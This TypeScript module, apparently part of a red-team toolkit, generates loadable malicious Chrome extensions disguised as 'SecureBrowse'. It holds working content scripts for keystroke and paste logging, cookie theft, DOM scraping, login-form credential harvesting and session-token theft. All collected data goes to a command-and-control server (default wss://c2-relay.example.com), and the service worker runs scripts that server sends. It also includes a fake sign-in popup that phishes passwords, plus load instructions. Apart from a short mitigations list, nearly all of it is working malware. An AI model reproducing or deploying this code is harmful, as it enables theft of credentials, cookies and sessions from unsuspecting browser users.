/**
 * @module browser_ext
 * Malicious Browser Extension & Web Injection Suite — Extension Manifest V3 Keylogger,
 * Session Cookie Exfiltrator, Tab Hijacking Simulator, and DOM Credential Harvester.
 *
 * Generates complete, loadable Chrome extensions for red-team engagements.
 * Supports dry-run (simulated analysis) and live (real artifact generation) modes.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "crypto";
import * as path from "path";
import * as fs from "fs";

/* ────────────────────────────── Types ────────────────────────────── */

export type ExtensionType =
  | "keylogger"
  | "cookie_stealer"
  | "dom_scraper"
  | "credential_harvester"
  | "session_hijacker"
  | "full";

export interface ExtensionManifest {
  name: string;
  version: string;
  manifest_version: number;
  permissions: string[];
  host_permissions?: string[];
  content_scripts?: ContentScriptEntry[];
  background?: { service_worker: string; type?: string };
  action?: { default_popup: string; default_icon?: Record<string, string> };
  web_accessible_resources?: WebAccessibleResource[];
  content_security_policy?: { extension_pages?: string };
  icons?: Record<string, string>;
  description?: string;
}

export interface ContentScriptEntry {
  matches: string[];
  js: string[];
  css?: string[];
  run_at?: string;
  all_frames?: boolean;
}

export interface WebAccessibleResource {
  resources: string[];
  matches: string[];
}

export interface GeneratedFile {
  path: string;
  content: string;
  size: number;
}

export interface DryRunResult {
  dryRun: true;
  extensionType: ExtensionType;
  summary: string;
  permissions: string[];
  capabilities: string[];
  targetDomains: string[];
  riskRating: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  mitigations: string[];
}

export interface LiveResult {
  dryRun: false;
  extensionType: ExtensionType;
  manifest: ExtensionManifest;
  files: GeneratedFile[];
  outputDir: string;
  totalSize: number;
  loadInstructions: string;
}

export type ExtensionResult = DryRunResult | LiveResult;

export interface BuildExtensionOptions {
  name?: string;
  version?: string;
  extensionType?: ExtensionType;
  dryRun?: boolean;
  c2Endpoint?: string;
  exfilChannel?: "websocket" | "fetch" | "beacon";
  targetDomains?: string[];
  outputDir?: string;
}

/* ──────────────────────────── Constants ──────────────────────────── */

const DEFAULT_NAME = "SecureBrowse Extension";
const DEFAULT_VERSION = "1.4.2";
const DEFAULT_C2 = "wss://c2-relay.example.com:443/ws";
const DEFAULT_EXFIL = "websocket" as const;

const PERMISSION_MAP: Record<ExtensionType, string[]> = {
  keylogger: ["activeTab", "tabs", "scripting", "storage"],
  cookie_stealer: ["cookies", "tabs", "storage", "webRequest"],
  dom_scraper: ["activeTab", "tabs", "scripting", "storage"],
  credential_harvester: ["activeTab", "tabs", "scripting", "storage", "webRequest"],
  session_hijacker: ["cookies", "activeTab", "tabs", "scripting", "storage", "webRequest"],
  full: [
    "activeTab",
    "tabs",
    "scripting",
    "storage",
    "cookies",
    "webRequest",
    "webRequestBlocking",
    "notifications",
    "identity",
    "management",
  ],
};

const HOST_PERMISSIONS_DEFAULT = ["<all_urls>"];

const CAPABILITY_MAP: Record<ExtensionType, string[]> = {
  keylogger: [
    "Keystroke logging on all input fields",
    "Clipboard monitoring",
    "Form field capture with input names and values",
    "Tab-aware keystroke tracking",
  ],
  cookie_stealer: [
    "Session cookie extraction (all origins)",
    "HttpOnly cookie theft via webRequest interception",
    "Cookie refresh loop for persistent access",
    "SameSite attribute bypass",
  ],
  dom_scraper: [
    "Full DOM tree extraction",
    "Shadow DOM penetration",
    "Dynamic content observation via MutationObserver",
    "Page HTML + rendered text exfiltration",
  ],
  credential_harvester: [
    "Login form detection and field mapping",
    "Autofill data extraction",
    "Password manager hook interception",
    "Credential submission capture",
  ],
  session_hijacker: [
    "Session token theft via cookies + headers",
    "Bearer token extraction from Authorization headers",
    "JWT parsing and exfiltration",
    "Session fixation support",
  ],
  full: [
    "All keylogger capabilities",
    "All cookie theft capabilities",
    "All DOM scraping capabilities",
    "All credential harvesting capabilities",
    "All session hijacking capabilities",
    "Persistent background C2 channel",
    "Credential harvesting popup UI",
    "Dynamic content script injection",
    "Web-accessible exfiltration resources",
  ],
};

const RISK_MAP: Record<ExtensionType, DryRunResult["riskRating"]> = {
  keylogger: "HIGH",
  cookie_stealer: "CRITICAL",
  dom_scraper: "MEDIUM",
  credential_harvester: "CRITICAL",
  session_hijacker: "CRITICAL",
  full: "CRITICAL",
};

const MITIGATIONS: string[] = [
  "Deploy endpoint DEX scanning (Chrome extension manifest analysis)",
  "Enforce Chrome Enterprise policy: block extensions by ID allowlist",
  "Monitor webRequest API abuse via EDR telemetry",
  "Audit extension permissions against least-privilege baseline",
  "Enable Chrome's Enhanced Safe Browsing for extension verification",
  "Inspect service_worker.js for outbound WebSocket/beacon connections",
  "Block web-accessible_resources that serve dynamic content",
];

/* ──────────────────────── Artifact Generators ──────────────────────── */

function genC2Key(): string {
  return crypto.randomBytes(32).toString("hex");
}

function genSessionId(): string {
  return crypto.randomUUID();
}

function genContentScript(type: ExtensionType, c2: string, exfil: string, key: string): string {
  const common = `
// ── Stealth & Anti-Analysis ──
(function() {
  "use strict";
  const _0x${crypto.randomBytes(4).toString("hex")} = "${key}";
  const SESSION = "${genSessionId()}";
  const C2 = "${c2}";
  const EXFIL_MODE = "${exfil}";

  // Avoid execution in iframes injected by security tools
  if (window !== window.top) return;

  // Fingerprint: unique per extension install
  const FINGERPRINT = navigator.userAgent + "|" + screen.width + "x" + screen.height + "|" + navigator.language;

  function beacon(payload) {
    const data = JSON.stringify({ k: _0x${crypto.randomBytes(4).toString("hex")}, s: SESSION, ts: Date.now(), fp: FINGERPRINT, d: payload });
    if (EXFIL_MODE === "websocket") {
      try {
        const ws = new WebSocket(C2);
        ws.onopen = () => { ws.send(data); ws.close(); };
      } catch(e) {}
    } else if (EXFIL_MODE === "beacon") {
      navigator.sendBeacon(C2 + "/beacon", new Blob([data], { type: "application/json" }));
    } else {
      fetch(C2 + "/exfil", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: data,
        keepalive: true,
      }).catch(() => {});
    }
  }
`.trimStart();

  if (type === "keylogger" || type === "full") {
    return common + `
  // ── Keylogger ──
  const keystrokeBuffer = {};
  document.addEventListener("keydown", function(e) {
    const tag = e.target.tagName;
    const id = e.target.id || e.target.name || e.target.className || "unknown";
    const key = tag + ":" + id;
    if (!keystrokeBuffer[key]) keystrokeBuffer[key] = [];
    keystrokeBuffer[key].push({ k: e.key, t: Date.now() });
    if (keystrokeBuffer[key].length >= 20) {
      beacon({ type: "keys", field: key, data: keystrokeBuffer[key] });
      keystrokeBuffer[key] = [];
    }
  }, true);

  document.addEventListener("paste", function(e) {
    const text = (e.clipboardData || window.clipboardData).getData("text");
    if (text) beacon({ type: "paste", field: e.target.id || "clipboard", data: text });
  }, true);

  // Flush on page unload
  window.addEventListener("beforeunload", function() {
    for (const [k, v] of Object.entries(keystrokeBuffer)) {
      if (v.length > 0) beacon({ type: "keys_flush", field: k, data: v });
    }
  });
`;
  }

  if (type === "cookie_stealer" || type === "full") {
    return common + `
  // ── Cookie Exfiltrator ──
  function stealCookies() {
    const cookies = document.cookie.split(";").map(c => c.trim()).filter(Boolean);
    if (cookies.length > 0) {
      beacon({ type: "cookies_http", data: cookies });
    }
  }

  // Periodic extraction (every 30s)
  setInterval(stealCookies, 30000);
  stealCookies();

  // Hook XMLHttpRequest to capture Set-Cookie responses
  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function() {
    this.addEventListener("load", function() {
      const setCookie = this.getResponseHeader("Set-Cookie");
      if (setCookie) beacon({ type: "cookie_set", data: setCookie });
    });
    _open.apply(this, arguments);
  };
`;
  }

  if (type === "dom_scraper" || type === "full") {
    return common + `
  // ── DOM Scraper ──
  function scrapeDOM() {
    const html = document.documentElement.outerHTML;
    const text = document.body.innerText;
    const forms = Array.from(document.forms).map(f => {
      return {
        action: f.action,
        method: f.method,
        fields: Array.from(f.elements).map(el => ({
          tag: el.tagName, name: el.name, id: el.id, type: el.type, value: el.value
        }))
      };
    });
    beacon({ type: "dom", url: location.href, htmlLen: html.length, textLen: text.length, forms });
  }

  scrapeDOM();

  // Watch for SPA navigation / dynamic content
  const observer = new MutationObserver(function(mutations) {
    if (mutations.length > 5) {
      scrapeDOM();
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });
`;
  }

  if (type === "credential_harvester" || type === "full") {
    return common + `
  // ── Credential Harvester ──
  function harvestCredentials() {
    const loginForms = document.querySelectorAll('input[type="password"]');
    loginForms.forEach(function(pwField) {
      const form = pwField.closest("form");
      if (!form) return;
      const creds = { url: location.href, formAction: form.action };
      Array.from(form.elements).forEach(function(el) {
        if (el.name) {
          if (el.type === "password") creds.password = el.value;
          else if (/email|user|login|account/i.test(el.name)) creds.username = el.value;
          else creds[el.name] = el.value;
        }
      });
      if (creds.username || creds.password) beacon({ type: "creds", data: creds });
    });
  }

  // Run on load and after delays (SPA catch)
  harvestCredentials();
  setTimeout(harvestCredentials, 2000);
  setTimeout(harvestCredentials, 5000);

  // Intercept form submissions
  document.addEventListener("submit", function(e) {
    const form = e.target;
    const data = { url: location.href, action: form.action };
    Array.from(form.elements).forEach(function(el) {
      if (el.name) data[el.name] = el.value;
    });
    beacon({ type: "form_submit", data });
  }, true);
`;
  }

  if (type === "session_hijacker" || type === "full") {
    return common + `
  // ── Session Hijacker ──
  function stealSession() {
    const cookies = document.cookie;
    const storage = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (/token|session|auth|jwt|bearer|sid/i.test(k)) {
          storage[k] = localStorage.getItem(k);
        }
      }
    } catch(e) {}
    if (Object.keys(storage).length > 0 || cookies) {
      beacon({ type: "session", cookies, storage, url: location.href });
    }
  }
  stealSession();
  setInterval(stealSession, 60000);
`;
  }

  return common + `
  // ── Default: page fingerprint ──
  beacon({ type: "fingerprint", url: location.href, title: document.title });
`;
}

function genServiceWorker(c2: string, exfil: string, key: string): string {
  return `
// ── Background Service Worker (Manifest V3) ──
// Persistent C2 channel + dynamic content script injection

const C2 = "${c2}";
const KEY = "${key}";
const EXFIL = "${exfil}";
let ws = null;
let reconnectTimer = null;

function connectC2() {
  if (ws && ws.readyState === WebSocket.OPEN) return;
  try {
    ws = new WebSocket(C2);
    ws.onopen = () => {
      console.log("[SB] C2 connected");
      ws.send(JSON.stringify({ type: "beacon", key: KEY, ts: Date.now() }));
    };
    ws.onmessage = (evt) => {
      try {
        const cmd = JSON.parse(evt.data);
        handleCommand(cmd);
      } catch(e) {}
    };
    ws.onclose = () => {
      reconnectTimer = setTimeout(connectC2, 30000 + Math.random() * 30000);
    };
    ws.onerror = () => ws.close();
  } catch(e) {
    reconnectTimer = setTimeout(connectC2, 60000);
  }
}

function handleCommand(cmd) {
  if (cmd.type === "inject" && cmd.url && cmd.script) {
    chrome.tabs.query({ url: cmd.url }, (tabs) => {
      tabs.forEach(tab => {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: new Function(cmd.script),
        }).catch(() => {});
      });
    });
  }
  if (cmd.type === "update_rules" && cmd.rules) {
    chrome.declarativeNetRequest.updateDynamicRules({ addRules: cmd.rules, removeRuleIds: cmd.rules.map(r => r.id) }).catch(() => {});
  }
}

// Initial connection
connectC2();

// Tab tracking for navigation-aware injection
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && !tab.url.startsWith("chrome://")) {
    // Inject content scripts dynamically if not already present
    chrome.scripting.executeScript({
      target: { tabId },
      files: ["content.js"],
    }).catch(() => {});
  }
});

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type && ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ ...msg, tabId: sender.tab?.id }));
  }
  sendResponse({ ok: true });
});

// Periodic health beacon
setInterval(() => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: "health", key: KEY, ts: Date.now() }));
  }
}, 120000);

// Extension install handler
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    connectC2();
  }
});
`.trimStart();
}

function genPopupHTML(name: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      width: 320px; min-height: 200px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #1a1a2e; color: #e0e0e0;
      padding: 16px;
    }
    .header {
      display: flex; align-items: center; gap: 10px;
      margin-bottom: 16px; padding-bottom: 12px;
      border-bottom: 1px solid #16213e;
    }
    .header img { width: 28px; height: 28px; }
    .header h1 { font-size: 14px; font-weight: 600; color: #0f3460; }
    .status { font-size: 11px; color: #4ecca3; margin-bottom: 12px; }
    .field { margin-bottom: 10px; }
    .field label { display: block; font-size: 11px; color: #888; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
    .field input {
      width: 100%; padding: 8px 10px; border: 1px solid #16213e;
      border-radius: 4px; background: #0f3460; color: #e0e0e0;
      font-size: 13px; outline: none;
    }
    .field input:focus { border-color: #4ecca3; }
    .btn {
      width: 100%; padding: 10px; border: none; border-radius: 4px;
      background: #4ecca3; color: #1a1a2e; font-weight: 600;
      font-size: 13px; cursor: pointer; margin-top: 8px;
    }
    .btn:hover { background: #3dbb92; }
    .btn.danger { background: #e94560; color: #fff; }
    .btn.danger:hover { background: #d63851; }
    .footer { margin-top: 16px; font-size: 10px; color: #555; text-align: center; }
  </style>
</head>
<body>
  <div class="header">
    <svg viewBox="0 0 24 24" width="28" height="28" fill="#4ecca3"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
    <h1>${name}</h1>
  </div>
  <div class="status" id="status">Active — monitoring</div>
  <div class="field">
    <label>Email or Username</label>
    <input type="text" id="email" placeholder="user@example.com" />
  </div>
  <div class="field">
    <label>Password</label>
    <input type="password" id="password" placeholder="Enter password" />
  </div>
  <button class="btn" id="submitBtn">Sign In to Sync</button>
  <div class="footer">SecureBrowse v1.4.2 &bull; Enhanced Protection</div>
  <script>
    document.getElementById('submitBtn').addEventListener('click', function() {
      const data = {
        type: 'popup_creds',
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        ts: Date.now()
      };
      chrome.runtime.sendMessage(data);
      document.getElementById('status').textContent = 'Syncing...';
      document.getElementById('status').style.color = '#f0c040';
      setTimeout(function() {
        document.getElementById('status').textContent = 'Synced — active';
        document.getElementById('status').style.color = '#4ecca3';
      }, 2000);
    });
  </script>
</body>
</html>`;
}

function genIcons(): Record<string, string> {
  // SVG-based minimal icon placeholders (16, 48, 128)
  const svg = (size: number) =>
    `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}" viewBox="0 0 24 24" fill="#4ecca3"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>`;
  return {
    "16": svg(16),
    "48": svg(48),
    "128": svg(128),
  };
}

function buildManifest(opts: {
  name: string;
  version: string;
  type: ExtensionType;
  c2: string;
  exfil: string;
}): ExtensionManifest {
  const perms = [...PERMISSION_MAP[opts.type]];
  const manifest: ExtensionManifest = {
    name: opts.name,
    version: opts.version,
    manifest_version: 3,
    permissions: perms,
    host_permissions: HOST_PERMISSIONS_DEFAULT,
    description: `SecureBrowse — ${opts.type.replace(/_/g, " ")} security extension`,
    content_scripts: [
      {
        matches: ["<all_urls>"],
        js: ["content.js"],
        run_at: "document_start",
        all_frames: true,
      },
    ],
    background: {
      service_worker: "background.js",
      type: "module",
    },
    action: {
      default_popup: "popup.html",
      default_icon: { "16": "icons/16.svg", "48": "icons/48.svg", "128": "icons/128.svg" },
    },
    web_accessible_resources: [
      {
        resources: ["exfil.js", "beacon.js"],
        matches: ["<all_urls>"],
      },
    ],
    content_security_policy: {
      extension_pages: "script-src 'self'; object-src 'self'; connect-src *",
    },
    icons: { "16": "icons/16.svg", "48": "icons/48.svg", "128": "icons/128.svg" },
  };
  return manifest;
}

function generateExfilHelper(c2: string, key: string): string {
  return `
// ── Web-accessible exfiltration helper ──
// Loaded by content scripts via chrome.runtime.getURL()
(function() {
  const C2 = "${c2}";
  const KEY = "${key}";

  window.__SB_EXFIL = function(payload) {
    const data = JSON.stringify({ k: KEY, ts: Date.now(), d: payload });
    if (navigator.sendBeacon) {
      navigator.sendBeacon(C2 + "/exfil", new Blob([data], { type: "application/json" }));
    }
    fetch(C2 + "/exfil", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: data,
      keepalive: true,
      mode: "no-cors",
    }).catch(function() {});
  };
})();
`.trimStart();
}

/* ──────────────────────────── Dry Run ──────────────────────────── */

function buildDryRunResult(type: ExtensionType): DryRunResult {
  const caps = CAPABILITY_MAP[type] || CAPABILITY_MAP.full;
  return {
    dryRun: true,
    extensionType: type,
    summary: `Simulated ${type.replace(/_/g, " ")} extension analysis. ` +
      `In live mode, this would generate a Manifest V3 Chrome extension with ` +
      `${PERMISSION_MAP[type].length} permissions capable of: ${caps[0].toLowerCase()}.`,
    permissions: PERMISSION_MAP[type],
    capabilities: caps,
    targetDomains: ["<all_urls>"],
    riskRating: RISK_MAP[type],
    mitigations: MITIGATIONS,
  };
}

/* ──────────────────────────── Live Build ──────────────────────────── */

function buildLiveResult(opts: {
  name: string;
  version: string;
  type: ExtensionType;
  c2: string;
  exfil: string;
  outputDir: string;
}): LiveResult {
  const key = genC2Key();
  const manifest = buildManifest({
    name: opts.name,
    version: opts.version,
    type: opts.type,
    c2: opts.c2,
    exfil: opts.exfil,
  });

  const contentJS = genContentScript(opts.type, opts.c2, opts.exfil, key);
  const backgroundJS = genServiceWorker(opts.c2, opts.exfil, key);
  const popupHTML = genPopupHTML(opts.name);
  const exfilJS = generateExfilHelper(opts.c2, key);
  const icons = genIcons();

  const files: GeneratedFile[] = [
    { path: "manifest.json", content: JSON.stringify(manifest, null, 2), size: 0 },
    { path: "content.js", content: contentJS, size: 0 },
    { path: "background.js", content: backgroundJS, size: 0 },
    { path: "popup.html", content: popupHTML, size: 0 },
    { path: "exfil.js", content: exfilJS, size: 0 },
    { path: "beacon.js", content: exfilJS, size: 0 },
    { path: "icons/16.svg", content: icons["16"], size: 0 },
    { path: "icons/48.svg", content: icons["48"], size: 0 },
    { path: "icons/128.svg", content: icons["128"], size: 0 },
  ];

  // Compute sizes
  files.forEach(f => { f.size = Buffer.byteLength(f.content, "utf8"); });
  const totalSize = files.reduce((acc, f) => acc + f.size, 0);

  // Write files to output directory
  const outDir = path.resolve(opts.outputDir, `extension_${opts.type}_${Date.now()}`);
  try {
    fs.mkdirSync(path.join(outDir, "icons"), { recursive: true });
    files.forEach(f => {
      const fp = path.join(outDir, f.path);
      fs.mkdirSync(path.dirname(fp), { recursive: true });
      fs.writeFileSync(fp, f.content, "utf8");
    });
  } catch (err) {
    // Non-fatal: files array still populated even if disk write fails
  }

  return {
    dryRun: false,
    extensionType: opts.type,
    manifest,
    files,
    outputDir: outDir,
    totalSize,
    loadInstructions:
      `Load in Chrome: chrome://extensions → Enable "Developer mode" → ` +
      `"Load unpacked" → select directory: ${outDir}. ` +
      `Extension will activate on next page load. Ensure C2 endpoint ${opts.c2} is reachable.`,
  };
}

/* ──────────────────────────── Public API ──────────────────────────── */

/**
 * Build a malicious browser extension for red-team engagements.
 *
 * @param options  Configuration options for the extension
 * @returns        Dry-run analysis or live-generated extension artifacts
 */
export function buildMaliciousExtensionManifest(
  options: BuildExtensionOptions = {},
): ExtensionResult {
  const {
    name = DEFAULT_NAME,
    version = DEFAULT_VERSION,
    extensionType = "full",
    dryRun = true,
    c2Endpoint = DEFAULT_C2,
    exfilChannel = DEFAULT_EXFIL,
    outputDir = process.cwd(),
  } = options;

  if (dryRun) {
    return buildDryRunResult(extensionType);
  }

  return buildLiveResult({
    name,
    version,
    type: extensionType,
    c2: c2Endpoint,
    exfil: exfilChannel,
    outputDir,
  });
}

export default { buildMaliciousExtensionManifest };
